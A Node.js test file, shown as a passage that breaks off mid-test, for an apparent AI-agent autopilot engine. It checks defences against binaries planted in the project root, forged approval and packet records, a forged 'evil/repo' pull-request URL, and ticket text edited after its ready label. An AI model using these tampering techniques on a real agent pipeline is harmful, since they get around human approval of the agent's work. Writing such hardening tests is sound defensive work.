test('a git planted in the project root is never the one started', () => {
  const dir = tempRepo();
  const record = path.join(dir, 'planted-ran');
  plantTool(dir, 'git', record);
  const realGit = resolveTool('git', { root: dir });
  assert.ok(realGit, 'a real git resolves');
  const saved = process.env[win ? 'Path' : 'PATH'];
  process.env[win ? 'Path' : 'PATH'] = [dir, '.', path.dirname(realGit), ...pathWithout('git')].join(path.delimiter);
  try {
    const r = repos.git(dir, ['rev-parse', '--is-inside-work-tree']);
    assert.equal(r.ok, true, r.stderr);
    assert.equal(r.stdout.trim(), 'true');
    assert.equal(repos.snapshotHooks(dir).length > 0, true);
  } finally {
    process.env[win ? 'Path' : 'PATH'] = saved;
  }
  assert.equal(fs.existsSync(record), false, 'the planted git did not run');
});

test('ULTRAPOWERS_GIT is accepted only as an absolute path', () => {
  const dir = tempRepo();
  const saved = process.env.ULTRAPOWERS_GIT;
  try {
    process.env.ULTRAPOWERS_GIT = 'git';
    const relative = repos.git(dir, ['rev-parse', 'HEAD']);
    assert.equal(relative.ok, false);
    assert.match(relative.stderr, /ULTRAPOWERS_GIT.*absolute/);
    process.env.ULTRAPOWERS_GIT = resolveTool('git', { root: dir });
    assert.equal(repos.git(dir, ['rev-parse', '--is-inside-work-tree']).ok, true);
  } finally {
    if (saved === undefined) delete process.env.ULTRAPOWERS_GIT; else process.env.ULTRAPOWERS_GIT = saved;
  }
});

test('a gh or glab planted in the project root is not started: the tracker reports no-cli', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'autopilot-hardening-gh-'));
  plantTool(root, 'gh', path.join(root, 'planted-ran'));
  plantTool(root, 'glab', path.join(root, 'planted-ran'));
  const env = { [win ? 'Path' : 'PATH']: [root, '.'].join(path.delimiter), PATHEXT: '.COM;.EXE;.BAT;.CMD' };
  for (const [provider, host, cli] of [['github', 'github.com', 'gh'], ['gitlab', 'gitlab.example.com', 'glab']]) {
    const tracker = trackerFor({ provider, host, path: 'o/r', root }, env);
    await assert.rejects(tracker.labels(1), (err) => err.code === 'no-cli' && new RegExp(`${cli} is not on PATH`).test(err.message));
  }
  assert.equal(fs.existsSync(path.join(root, 'planted-ran')), false);
});

test('a harness planted in the project root is not started: the stage ends with "not on PATH"', () => {
  const ws = workspace();
  plantTool(ws.root, 'claude', path.join(ws.root, 'planted-ran'));
  const gitDir = path.dirname(resolveTool('git', { root: ws.root }));
  // Both spellings: a Git Bash environment carries PATH, a native one Path, and the child takes one.
  const searchPath = [ws.root, '.', gitDir].join(path.delimiter);
  const r = run(ws, ['run', 'GH-16', '--once'], { ULTRAPOWERS_CLAUDE: '', PATH: searchPath, Path: searchPath, ULTRAPOWERS_STAGE_GH_TOKEN: '', ULTRAPOWERS_STAGE_GITLAB_TOKEN: '' });
  assert.ok(r.json?.stages, r.stdout + r.stderr);
  assert.match(r.json.stages[0].message, /claude is not on PATH/);
  assert.equal(r.json.stages[0].exitCode, 127);
  assert.equal(fs.existsSync(path.join(ws.root, 'planted-ran')), false);
});

test('the harness override keeps working: a .mjs override runs under node', () => {
  const ws = workspace();
  const r = run(ws, ['run', 'GH-16', '--once'], { ULTRAPOWERS_CLAUDE: HARNESS_STUB, STUB_LOG: path.join(ws.stubDir, 'calls.log'), ULTRAPOWERS_STAGE_GH_TOKEN: '', ULTRAPOWERS_STAGE_GITLAB_TOKEN: '' });
  assert.ok(r.json?.stages?.length > 0, r.stdout + r.stderr);
  assert.equal(r.json.stages[0].exitCode, 0, JSON.stringify(r.json.stages));
});

// ---------------------------------------------------------------------------------------------
// M7: the approval is bound to the engine's own packet on the tracker, not to autopilot.json
// ---------------------------------------------------------------------------------------------

const MINIMAL_SPEC = fs.readFileSync(path.join(REPO, 'tests', 'brainstorming', 'fixtures', 'minimal-valid.md'), 'utf8').replace(/\r\n/g, '\n');
const LEDGER_ROWS = '| 1 | Which cache? | none | low | not asked |\n| 2 | Which auth? | OIDC | high | the app uses it |\n';
const SPEC = (scope) => MINIMAL_SPEC
  .replace(/^(## Repositories in scope\n)(?:- .*\n)+/m, (_, heading) => `${heading}${scope.map((s) => `- ${s}`).join('\n')}\n`)
  .replace(/^\|---\|---\|---\|---\|---\|\n/m, (separator) => `${separator}${LEDGER_ROWS}`);
const PLAN = (scope) => `# Plan\n\n## Repositories in scope\n\n${scope.map((s) => `- ${s}`).join('\n')}\n\n### Task 1\n`;

function throughPlan(ws, { scope = ['.'], id = 'GH-16', env = {} } = {}) {
  assert.equal(run(ws, ['begin', id, 'scaffold'], env).code, 0);
  fs.mkdirSync(path.join(ws.root, 'tasks', id), { recursive: true });
  fs.writeFileSync(path.join(ws.root, 'tasks', id, `${id}.md`), `# ${id} - Fix it now please\n`);
  run(ws, ['end', id, 'scaffold', '--result', JSON.stringify({ ok: true })], env);
  run(ws, ['begin', id, 'spec'], env);
  fs.mkdirSync(path.join(ws.root, 'specs', id), { recursive: true });
  fs.writeFileSync(path.join(ws.root, 'specs', id, 'Spec.md'), SPEC(scope));
  git(ws.root, 'add', '-A');
  git(ws.root, 'commit', '-q', '-m', `spec(${id}): spec`);
  assert.equal(run(ws, ['end', id, 'spec', '--result', JSON.stringify({ ok: true })], env).json?.status, 'finished');
  run(ws, ['begin', id, 'plan'], env);
  fs.mkdirSync(path.join(ws.root, 'plans', id), { recursive: true });
  fs.writeFileSync(path.join(ws.root, 'plans', id, 'Plan.md'), PLAN(scope));
  git(ws.root, 'add', '-A');
  git(ws.root, 'commit', '-q', '-m', `plan(${id}): plan`);
  run(ws, ['end', id, 'plan', '--result', JSON.stringify({ ok: true })], env);
}

const APPROVE_AT = '2999-01-01T00:00:00Z';
const approvalTimeline = (login, at = APPROVE_AT) => ({ 'api repos/o/r/issues/16/timeline': { stdout: [[{ id: 'e1', event: 'labeled', label: { name: 'up:approve' }, actor: { login }, created_at: at }]] } });
const approvedBy = (login) => ({
  ...approvalTimeline(login),
  [`api repos/o/r/collaborators/${login}/permission`]: { stdout: { permission: 'write' } },
  'issue edit 16 -R o/r --remove-label up:approve': { stdout: '' },
});
const writeStateFile = (ws, s, id = 'GH-16') => fs.writeFileSync(path.join(ws.root, 'tasks', id, 'autopilot.json'), `${JSON.stringify(s, null, 2)}\n`);
const callRecords = (ws) => fs.readFileSync(path.join(ws.stubDir, 'calls.log'), 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
const PR_URL = 'https://github.com/o/r/pull/9';
const PR_LIST = (urls) => ({ 'pr list -R o/r --head GH-16-fix-it-now-please --state open --json url --limit 1': { stdout: urls.map((url) => ({ url })) } });
const PR_CREATE = { 'pr create -R o/r --head GH-16-fix-it-now-please --base main': { stdout: `${PR_URL}\n` } };
const PR_COMMENTS = {
  [`pr comment ${PR_URL} --body-file -`]: { stdout: `${PR_URL}#issuecomment-21\n` },
  'pr comment https://github.com/evil/repo/pull/1 --body-file -': { stdout: 'https://github.com/evil/repo/pull/1#issuecomment-99\n' },
};

// Through the packet and the approval: the ticket stands at the gate, approved, ready for `begin execute`.
function approvedAtGate(ws, env = {}) {
  throughPlan(ws);
  assert.equal(run(ws, ['packet', 'GH-16'], env).code, 0);
  ws.setMap({ ...approvedBy('alice'), ...PR_CREATE });
  const n = run(ws, ['next', 'GH-16']);
  assert.equal(n.json?.reason, 'approved', n.stdout + n.stderr);
}

test('M7: a state file whose packet matches the latest engine packet passes', () => {
  const ws = workspace();
  approvedAtGate(ws);
  const b = run(ws, ['begin', 'GH-16', 'execute']);
  assert.equal(b.code, 0, b.stdout + b.stderr);
});

test('M7: a forged docsTip with a real approval event is refused, with both packet ids in the message', () => {
  const ws = workspace();
  approvedAtGate(ws);
  const s = state(ws);
  const forged = 'f'.repeat(40);
  writeStateFile(ws, { ...s, packet: { ...s.packet, docsTip: forged }, approval: { ...s.approval, docsTip: forged } });
  const b = run(ws, ['begin', 'GH-16', 'execute']);
  assert.equal(b.code, 2, b.stdout);
  assert.equal(b.json.error.code, 'approval-unverified');
  assert.match(b.json.error.message, /latest packet the engine posted on the tracker is [0-9a-f]{12}; the state file names [0-9a-f]{12}/);
  // pr refuses it too
  const pr = run(ws, ['pr', 'GH-16']);
  assert.equal(pr.json.error.code === 'approval-unverified' || pr.json.error.code === 'wrong-stage', true, pr.stdout);
});

test('M7: a full-mode approval is bound to the packet too', () => {
  const ws = workspace({ autopilot: { mode: 'full', baseBranch: 'main' } });
  throughPlan(ws);
  assert.equal(run(ws, ['packet', 'GH-16']).code, 0);
  assert.equal(run(ws, ['begin', 'GH-16', 'execute']).code, 0, 'the engine\'s own packet and approval pass');
  run(ws, ['end', 'GH-16', 'execute', '--result', JSON.stringify({ ok: true })]);
  const s = state(ws);
  const forged = 'e'.repeat(40);
  writeStateFile(ws, { ...s, packet: { ...s.packet, docsTip: forged }, approval: { ...s.approval, docsTip: forged } });
  const pr = run(ws, ['pr', 'GH-16']);
  assert.equal(pr.json.error.code, 'approval-unverified', pr.stdout);
  assert.match(pr.json.error.message, /latest packet the engine posted/);
});

test('M7: a packet comment by another author with the right id does not count', () => {
  const ws = workspace();
  throughPlan(ws);
  // The stub lists what was posted under STUB_ME; `api user` still says engine-bot.
  assert.equal(run(ws, ['packet', 'GH-16'], { STUB_ME: 'mallory' }).code, 0);
  ws.setMap({ ...approvedBy('alice'), ...PR_CREATE });
  const n = run(ws, ['next', 'GH-16']);
  assert.equal(n.json.reason, 'approved');
  const b = run(ws, ['begin', 'GH-16', 'execute']);
  assert.equal(b.json.error.code, 'approval-unverified', b.stdout);
  assert.match(b.json.error.message, /holds no packet the engine posted/);
});

test('M7: an approval event older than the latest packet is refused', () => {
  const ws = workspace();
  approvedAtGate(ws);
  // The timeline now shows the same event id, from before the packet (as a rewritten timeline would).
  ws.setMap({ ...approvalTimeline('alice', '2000-01-01T00:00:00Z') });
  const b = run(ws, ['begin', 'GH-16', 'execute']);
  assert.equal(b.json.error.code, 'approval-unverified', b.stdout);
  assert.match(b.json.error.message, /not after the latest packet/);
});

test('M7: a forged prUrl is replaced by the forge URL for the branch, and no comment goes to the forged one', () => {
  const ws = workspace();
  approvedAtGate(ws);
  assert.equal(run(ws, ['begin', 'GH-16', 'execute']).code, 0);
  fs.writeFileSync(path.join(ws.root, 'FEATURE.md'), 'done\n');
  git(ws.root, 'add', '-A');
  git(ws.root, 'commit', '-q', '-m', 'feat: the work');
  run(ws, ['end', 'GH-16', 'execute', '--result', JSON.stringify({ ok: true })]);
  const s = state(ws);
  writeStateFile(ws, { ...s, pr: { ...s.pr, docs: 'https://github.com/evil/repo/pull/1' } });
  ws.setMap({ ...approvedBy('alice'), ...PR_LIST([PR_URL]), ...PR_COMMENTS });
  const r = run(ws, ['pr', 'GH-16']);
  assert.equal(r.code, 0, r.stdout + r.stderr);
  assert.equal(r.json.prs.docs, PR_URL);
  assert.equal(state(ws).pr.docs, PR_URL);
  const corrected = fs.readFileSync(path.join(ws.root, 'tasks', 'GH-16', 'stage-log.jsonl'), 'utf8').trim().split('\n').map((l) => JSON.parse(l)).find((l) => l.event === 'pr-url-corrected');
  assert.ok(corrected, 'the log says the URL was corrected');
  assert.deepEqual([corrected.stored, corrected.url], ['https://github.com/evil/repo/pull/1', PR_URL]);
  const targets = callRecords(ws).filter((c) => c.args[0] === 'pr' && c.args[1] === 'comment').map((c) => c.args[2]);
  assert.ok(targets.length > 0 && targets.every((t) => t === PR_URL), `comments go to the forge's URL only: ${targets}`);
  assert.ok(!callRecords(ws).some((c) => c.args.includes('https://github.com/evil/repo/pull/1')), 'nothing is sent to the forged URL');
});

test('M7: a stored URL the forge does not know is not trusted: the pull request is created as for a new one', () => {
  const ws = workspace();
  approvedAtGate(ws);
  assert.equal(run(ws, ['begin', 'GH-16', 'execute']).code, 0);
  fs.writeFileSync(path.join(ws.root, 'FEATURE.md'), 'done\n');
  git(ws.root, 'add', '-A');
  git(ws.root, 'commit', '-q', '-m', 'feat: the work');
  run(ws, ['end', 'GH-16', 'execute', '--result', JSON.stringify({ ok: true })]);
  const s = state(ws);
  writeStateFile(ws, { ...s, pr: { ...s.pr, docs: 'https://github.com/evil/repo/pull/1' } });
  ws.setMap({ ...approvedBy('alice'), ...PR_LIST([]), ...PR_CREATE, ...PR_COMMENTS });
  const r = run(ws, ['pr', 'GH-16']);
  assert.equal(r.code, 0, r.stdout + r.stderr);
  assert.equal(r.json.prs.docs, PR_URL);
  assert.equal(callRecords(ws).filter((c) => c.args[0] === 'pr' && c.args[1] === 'create').length, 1);
});

// ---------------------------------------------------------------------------------------------
// M9: the ready label binds the ticket body as it was when the label went on
// ---------------------------------------------------------------------------------------------

const READY = { 'issue list -R o/r --label up:ready': { stdout: [{ number: 16, title: 'T16', updatedAt: '2026-10-04T00:00:00Z' }] }, 'issue list -R o/r --label up:approve': { stdout: [] }, 'issue list -R o/r --label up:changes': { stdout: [] } };
const READY_LABELED_AT = '2026-10-04T08:00:00Z';
const readyTicket = (extra = {}) => ({
  ...READY,
  'issue view 16 -R o/r --json labels': { stdout: { labels: [{ name: 'up:ready' }] } },
  'issue edit 16 -R o/r --remove-label up:ready': { stdout: '' },
  'api repos/o/r/issues/16/timeline': { stdout: [[{ id: 'ready-16', event: 'labeled', label: { name: 'up:ready' }, actor: { login: 'owner' }, created_at: READY_LABELED_AT }]] },
  'api repos/o/r/collaborators/owner/permission': { stdout: { permission: 'admin' } },
  ...extra,
});
const edited = (at) => ({ 'api graphql': { stdout: { data: { repository: { issue: { lastEditedAt: at } } } } } });
const headless = (extra = {}) => ({ ULTRAPOWERS_CLAUDE: HARNESS_STUB, ULTRAPOWERS_AUTOPILOT_MAX_TURNS: '7', ULTRAPOWERS_STAGE_GH_TOKEN: '', ULTRAPOWERS_STAGE_GITLAB_TOKEN: '', ...extra });
const briefFile = (ws, id = 'GH-16') => path.join(ws.root, '.ultrapowers', 'autopilot', `${id}.brief.json`);

test('M9 GitHub: a body edited after the ready label is not picked up: comment, label removed, no stage', () => {
  const ws = workspace({ map: readyTicket(edited('2026-10-04T08:30:00Z')) });
  const r = run(ws, ['watch', '--once'], headless());
  assert.equal(r.code, 0, r.stdout + r.stderr);
  assert.ok(r.json.events.some((e) => e.event === 'skip' && e.reason === 'body-edited-after-ready-label'), JSON.stringify(r.json.events));
  assert.ok(!r.json.events.some((e) => e.event === 'ran'));
  assert.ok(ws.calls().some((a) => a.includes('--remove-label') && a.includes('up:ready')), 'the ready label is removed');
  const comments = callRecords(ws).filter((c) => c.args[0] === 'issue' && c.args[1] === 'comment').map((c) => c.stdin);
  assert.equal(comments.length, 1);
  assert.match(comments[0], /ticket body changed after the ready label was added \(label at 2026-10-04T08:00:00Z, last edit at 2026-10-04T08:30:00Z\)/);
  assert.match(comments[0], /re-applies the label after reading the new text/);
  assert.ok(!fs.existsSync(briefFile(ws)));
});

test('M9 GitHub: an edit before the label, or none, proceeds and is recorded', () => {
  for (const at of ['2026-10-04T07:00:00Z', '2026-10-04T08:00:00Z', null]) {
    const ws = workspace({ map: readyTicket(edited(at)) });
    const r = run(ws, ['watch', '--once'], headless());
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.ok(r.json.events.some((e) => e.event === 'ran'), `${at}: ${JSON.stringify(r.json.events)}`);
    assert.equal(JSON.parse(fs.readFileSync(briefFile(ws), 'utf8')).labelAt, READY_LABELED_AT);
  }
});

// A ticket the session door picked up with the ready label on it: begin scaffold records the body.
function sessionScaffold(ws) {
  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
  assert.equal(JSON.parse(fs.readFileSync(briefFile(ws), 'utf8')).labelAt, READY_LABELED_AT);
  fs.mkdirSync(path.join(ws.root, 'tasks', 'GH-16'), { recursive: true });
  fs.writeFileSync(path.join(ws.root, 'tasks', 'GH-16', 'GH-16.md'), '# GH-16 - Fix it now please\n');
  assert.equal(run(ws, ['end', 'GH-16', 'scaffold', '--result', JSON.stringify({ ok: true })]).code, 0);
}

test('M9 GitHub: an edit between pickup and the spec stage blocks the ticket and takes the ready label off', () => {
  const ws = workspace({ map: readyTicket(edited(null)) });
  sessionScaffold(ws);
  ws.setMap(readyTicket(edited('2026-10-04T09:30:00Z')));
  // The session door: begin spec compares the body.
  const b = run(ws, ['begin', 'GH-16', 'spec']);
  assert.equal(b.code, 2, b.stdout + b.stderr);
  assert.equal(b.json.error.code, 'body-edited');
  assert.match(b.json.error.message, /last edit at 2026-10-04T09:30:00Z/);
  assert.equal(state(ws).stageStatus, 'blocked');
  assert.ok(ws.calls().some((a) => a.includes('--add-label') && a.includes('up:blocked')));
  assert.ok(ws.calls().some((a) => a.includes('--remove-label') && a.includes('up:ready')));
  // The watcher compares before it spawns the stage.
  const w = workspace({ map: readyTicket(edited(null)) });
  sessionScaffold(w);
  w.setMap(readyTicket(edited('2026-10-04T09:30:00Z')));
  const r = run(w, ['run', 'GH-16', '--once'], headless());
  assert.equal(r.code, 2, r.stdout + r.stderr);
  assert.equal(r.json.error.code, 'body-edited');
  assert.equal(callRecords(w).filter((c) => c.harness === 'stub').length, 0, 'no stage was spawned');
});

test('M9 GitHub: the ready label applied again after the edit is a new pickup', () => {
  const ws = workspace({ map: readyTicket(edited(null)) });
  sessionScaffold(ws);
  const again = '2999-01-01T00:00:00Z';
  ws.setMap(readyTicket({
    ...edited('2026-10-04T09:30:00Z'),
    'api repos/o/r/issues/16/timeline': { stdout: [[
      { id: 'ready-16', event: 'labeled', label: { name: 'up:ready' }, actor: { login: 'owner' }, created_at: READY_LABELED_AT },
      { id: 'ready-16b', event: 'labeled', label: { name: 'up:ready' }, actor: { login: 'owner' }, created_at: again },
    ]] },
  }));
  const r = run(ws, ['run', 'GH-16', '--once'], headless());
  assert.equal(r.code, 0, r.stdout + r.stderr);
  assert.equal(r.json.stages[0].stage, 'spec');
  assert.equal(JSON.parse(fs.readFileSync(briefFile(ws), 'utf8')).labelAt, again);
});


test('M9 GitLab: a "changed the description" note after the label blocks pickup', () => {
  const ws = workspace({ map: {} });
  writeMarker(ws, (m) => { m.tickets.sources = [{ prefix: 'GL', provider: 'gitlab', namespace: 'acme', defaultProject: 'app', host: 'gitlab.example.com' }]; });
  const enc = 'acme%2Fapp';
  const labelAt = '2026-10-04T08:00:00Z';
  const base = (noteAt) => ({
    'issue list -R acme/app -l up:ready': { stdout: [{ iid: 7, title: 'T7', updated_at: '2026-10-04T00:00:00Z' }] },
    'issue list -R acme/app -l up:approve': { stdout: [] },
    'issue list -R acme/app -l up:changes': { stdout: [] },
    [`api projects/${enc}/issues/7/resource_label_events`]: { stdout: [{ id: 1, action: 'add', label: { name: 'up:ready' }, user: { username: 'owner' }, created_at: labelAt }] },
    'api users?username=owner': { stdout: [{ id: 5 }] },
    [`api projects/${enc}/members/all/5`]: { stdout: { access_level: 50 } },
    [`api projects/${enc}/issues/7/notes`]: { stdout: noteAt ? [{ id: 3, system: true, body: 'changed the description', created_at: noteAt, author: { username: 'author' } }, { id: 4, system: true, body: 'added ~up::ready label', created_at: labelAt, author: { username: 'owner' } }] : [{ id: 4, system: true, body: 'added label', created_at: labelAt, author: { username: 'owner' } }] },
    'issue update 7 -R acme/app --unlabel up:ready': { stdout: '' },
    'issue note 7 -R acme/app -m': { stdout: 'https://gitlab.example.com/acme/app/-/issues/7#note_1\n' },
  });
  ws.setMap(base('2026-10-04T08:30:00Z'));
  const r = run(ws, ['watch', '--once'], headless());
  assert.equal(r.code, 0, r.stdout + r.stderr);
  assert.ok(r.json.events.some((e) => e.event === 'skip' && e.reason === 'body-edited-after-ready-label'), JSON.stringify(r.json.events));
  assert.ok(ws.calls().some((a) => a.join(' ').startsWith('issue update 7') && a.includes('--unlabel') && a.includes('up:ready')));
  const note = ws.calls().find((a) => a[0] === 'issue' && a[1] === 'note');
  assert.match(note.join(' '), /ticket body changed after the ready label was added/);
  // A note from before the label does not block: pickup reaches the stage.
  const ws2 = workspace({ map: {} });
  writeMarker(ws2, (m) => { m.tickets.sources = [{ prefix: 'GL', provider: 'gitlab', namespace: 'acme', defaultProject: 'app', host: 'gitlab.example.com' }]; });
  ws2.setMap({ ...base('2026-10-04T07:00:00Z') });
  const r2 = run(ws2, ['watch', '--once'], headless());
  assert.ok(!r2.json.events.some((e) => e.reason === 'body-edited-after-ready-label'), JSON.stringify(r2.json.events));
  assert.ok(fs.existsSync(briefFile(ws2, 'GL-7')), 'pickup recorded the label');
});

// Odoo: no body edit time; the description's hash is recorded at pickup and compared before each stage.
const ODOO_FAKE = path.join(HERE, 'fixtures', 'odoo-fake.mjs');
const ODOO_ID = 'ODOO-13627';
const odooChildren = [];
test.after(() => { for (const c of odooChildren) c.kill(); });

function startOdooProcess(spec) {
  return new Promise((resolve, reject) => {
    const seedFile = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'autopilot-odoo-seed-')), 'seed.json');
    fs.writeFileSync(seedFile, JSON.stringify(spec));
    const child = spawn(process.execPath, [ODOO_FAKE, 'serve', '--seed-file', seedFile], { stdio: ['ignore', 'pipe', 'pipe'] });
    odooChildren.push(child);
    let out = '';
    let err = '';
    child.stdout.on('data', (d) => {
      out += d;
      const line = out.split('\n').find((l) => l.startsWith('{'));
      if (line) resolve({ child, url: JSON.parse(line).url });
    });
    child.stderr.on('data', (d) => { err += d; });
    child.on('exit', (code) => reject(new Error(`the fake Odoo exited with ${code}: ${err}`)));
  });
}

async function odooWorkspace(seed) {
  const { url } = await startOdooProcess(seed);
  const ws = workspace({ odoo: url });
  const post = async (route, body) => (await fetch(`${url}${route}`, { method: 'POST', body: JSON.stringify(body), headers: { 'content-type': 'application/json' } })).json();
  ws.odoo = {
    state: async () => (await fetch(`${url}/__fake/state`)).json(),
    setDescription: (taskId, description) => post('/__fake/setDescription', { taskId, description }),
  };
  return ws;
}

const ODOO_READY = { setup: { initialTags: { 13627: [1, 2] }, tagTasks: [{ taskId: 13627, name: 'Ultrapowers Ready', by: 'val', at: '2026-10-05 08:30:00' }] } };

test('M9 Odoo: the description hash recorded at pickup blocks the spec stage when it changes', async () => {
  const ws = await odooWorkspace(ODOO_READY);
  assert.equal(run(ws, ['begin', ODOO_ID, 'scaffold']).code, 0);
  const brief = JSON.parse(fs.readFileSync(briefFile(ws, ODOO_ID), 'utf8'));
  assert.match(brief.bodyHash, /^[0-9a-f]{64}$/);
  fs.mkdirSync(path.join(ws.root, 'tasks', ODOO_ID), { recursive: true });
  fs.writeFileSync(path.join(ws.root, 'tasks', ODOO_ID, `${ODOO_ID}.md`), `# ${ODOO_ID} - Integration\n`);
  assert.equal(run(ws, ['end', ODOO_ID, 'scaffold', '--result', JSON.stringify({ ok: true })]).code, 0);
  // Unchanged: the spec stage begins.
  assert.equal(run(ws, ['begin', ODOO_ID, 'spec']).code, 0);
  run(ws, ['end', ODOO_ID, 'spec', '--result', JSON.stringify({ ok: false, message: 'redo' })]);
  await ws.odoo.setDescription(13627, '<p>Upgrade the integration AND wire it to the payment gateway.</p>');
  const blocked = run(ws, ['begin', ODOO_ID, 'spec']);
  assert.equal(blocked.code, 2, blocked.stdout + blocked.stderr);
  assert.equal(blocked.json.error.code, 'body-edited');
  assert.match(blocked.json.error.message, /re-applies the label after reading the new text/);
  assert.equal(state(ws, ODOO_ID).stageStatus, 'blocked');
});

test('M9 Odoo: a task written after the ready tag was added is not picked up when the tag time is known', async () => {
  const ws = await odooWorkspace({ setup: { initialTags: { 13627: [1, 2] }, tagTasks: [
    { taskId: 13627, name: 'Ultrapowers Ready', by: 'val', at: '2026-10-05 08:30:00' },
    { taskId: 13627, name: 'Backend', by: 'val', at: '2026-10-05 08:45:00' },
  ] } });
  const r = run(ws, ['begin', ODOO_ID, 'scaffold']);
  assert.equal(r.code, 2, r.stdout + r.stderr);
  assert.equal(r.json.error.code, 'body-edited');
  assert.ok(!fs.existsSync(briefFile(ws, ODOO_ID)));
});

test('M9: bodyEditedAt reads lastEditedAt (GitHub) and the latest "changed the description" note (GitLab); Odoo has none', async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'autopilot-bodytime-'));
  fs.writeFileSync(path.join(dir, 'map.json'), JSON.stringify({
    'api graphql': { stdout: { data: { repository: { issue: { lastEditedAt: '2026-10-04T08:30:00Z' } } } } },
    'api projects/acme%2Fapp/issues/7/notes': { stdout: [
      { id: 1, system: true, body: 'changed the description', created_at: '2026-10-04T08:10:00Z' },
      { id: 2, system: false, body: 'changed the description', created_at: '2026-10-04T09:00:00Z' },
      { id: 3, system: true, body: 'changed the description', created_at: '2026-10-04T08:40:00Z' },
      { id: 4, system: true, body: 'added a label', created_at: '2026-10-04T09:30:00Z' },
    ] },
  }));
  const env = { ...process.env, ULTRAPOWERS_GH: path.join(HERE, 'fixtures', 'tracker-stub.mjs'), ULTRAPOWERS_GLAB: path.join(HERE, 'fixtures', 'tracker-stub.mjs'), STUB_DIR: dir };
  const github = trackerFor({ provider: 'github', host: 'github.com', path: 'o/r' }, env);
  assert.equal(github.hasBodyEditTime, true);
  assert.equal(await github.bodyEditedAt(16), '2026-10-04T08:30:00Z');
  const gitlab = trackerFor({ provider: 'gitlab', host: 'gitlab.example.com', path: 'acme/app' }, env);
  assert.equal(await gitlab.bodyEditedAt(7), '2026-10-04T08:40:00Z', 'a user note and other system notes do not count');
  const odoo = trackerFor({ provider: 'odoo', url: 'http://127.0.0.1:1', path: '34', login: 'bot' }, process.env);
  assert.equal(odoo.hasBodyEditTime, false);
  assert.equal(await odoo.bodyEditedAt(1), null);
});

// ---- Release review 2026-10-23 (autopilot) ----

// The QA report (templates/report.md) carries a "Packet id" line too, posted after the approval: the
// packet binding must read the packet comment alone, or a resumed pr can never pass.
test('review: a posted QA report is not taken for the packet; a resumed pr still verifies the approval', () => {
  const ws = workspace();
  approvedAtGate(ws);
  const s = state(ws);
  // The engine posts a report-shaped comment after the approval, as postReport does.
  const report = `Autopilot QA report for GH-16\nPacket id ${s.packet.docsTip.slice(0, 12)} — approved by alice — Stage log head x\nPull requests\n\nbody`;
  fs.writeFileSync(path.join(ws.root, '.ultrapowers', 'post-report.txt'), report);
  // A comment by the engine that is not a packet: it must not shadow the real packet whatever its text.
  const child = run(ws, ['begin', 'GH-16', 'execute']);
  assert.equal(child.code, 0, child.stdout + child.stderr);
  // Simulate the QA report comment landing on the tracker, later than the packet.
  postComment(ws, report, '2999-06-01T00:00:00Z');
  const again = run(ws, ['end', 'GH-16', 'execute', '--result', JSON.stringify({ ok: true })]);
  assert.equal(again.code, 0, again.stdout + again.stderr);
  const pr = run(ws, ['pr', 'GH-16']);
  assert.notEqual(pr.json?.error?.code, 'approval-unverified', pr.stdout + pr.stderr);
});

test('review: a spec cell that says "Packet id <hex>" above the real line does not hijack the packet id', () => {
  const ws = workspace();
  throughPlan(ws);
  // The packet body puts the assumptions above its own Packet id line: an assumption cell may carry that text.
  assert.equal(run(ws, ['packet', 'GH-16']).code, 0);
  // The one packet the engine posted, rewritten as the tracker would hold it when a spec assumption
  // cell above the real last line spells another id: the id stays the last whole line's.
  const file = path.join(ws.stubDir, 'posted.json');
  const posted = JSON.parse(fs.readFileSync(file, 'utf8'));
  const packet = posted.at(-1);
  packet.body = packet.body.replace(/^(Assumptions to check[^\n]*\n)/m, '$1| 1 | Packet id aaaaaaaaaaaa in a cell | low | x |\n');
  assert.match(packet.body, /Packet id aaaaaaaaaaaa in a cell/, 'the cell is in the packet body');
  fs.writeFileSync(file, JSON.stringify(posted));
  ws.setMap({ ...approvedBy('alice', '2999-02-01T00:00:00Z'), ...PR_CREATE });
  const n = run(ws, ['next', 'GH-16']);
  assert.equal(n.json?.reason, 'approved', n.stdout + n.stderr);
  const b = run(ws, ['begin', 'GH-16', 'execute']);
  assert.equal(b.code, 0, b.stdout + b.stderr);
});

test('review: a corrupt config snapshot blocks the ticket but begin with no stage open rewrites it', () => {
  const ws = workspace();
  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
  assert.equal(run(ws, ['end', 'GH-16', 'scaffold', '--result', JSON.stringify({ ok: true })]).code, 0);
  fs.writeFileSync(configSnapshot(ws), '{not json');
  const st = run(ws, ['status', 'GH-16']);
  assert.equal(st.code, 0, 'status survives a corrupt snapshot: ' + st.stdout + st.stderr);
  const e = run(ws, ['begin', 'GH-16', 'spec']);
  assert.equal(e.code, 0, 'begin with no stage open takes a fresh snapshot: ' + e.stdout + e.stderr);
  assert.doesNotThrow(() => JSON.parse(fs.readFileSync(configSnapshot(ws), 'utf8')));
});

test('review: begin accepts the engine\'s next stage or a retry of the current one, no other', () => {
  const ws = workspace();
  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
  assert.equal(run(ws, ['end', 'GH-16', 'scaffold', '--result', JSON.stringify({ ok: true })]).code, 0);
  // After scaffold the next stage is spec: a stage that asks for plan (or the research-egress stage
  // changes) is refused; spec is accepted, and spec again (a retry) too.
  for (const wrong of ['plan', 'changes', 'execute', 'qa', 'pr']) {
    const r = run(ws, ['begin', 'GH-16', wrong]);
    assert.equal(r.json?.error?.code, 'wrong-stage', `${wrong}: ${r.stdout}${r.stderr}`);
  }
  assert.equal(run(ws, ['begin', 'GH-16', 'spec']).code, 0);
  assert.equal(run(ws, ['begin', 'GH-16', 'spec']).code, 0, 'a retry of the open stage');
});

// ---------------------------------------------------------------------------------------------
// Round 3 (re-hunt of 386b837): Medium 13 and 15, the snapshot and the status command
// ---------------------------------------------------------------------------------------------

test('round3 Medium 13: a changed repos, topology or qa key is a config change, and `next` blocks the ticket on it', () => {
  const ws = workspace({ nested: true, qa: true });
  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
  const original = fs.readFileSync(markerFile(ws), 'utf8');
  const snap = JSON.parse(fs.readFileSync(configSnapshot(ws), 'utf8'));
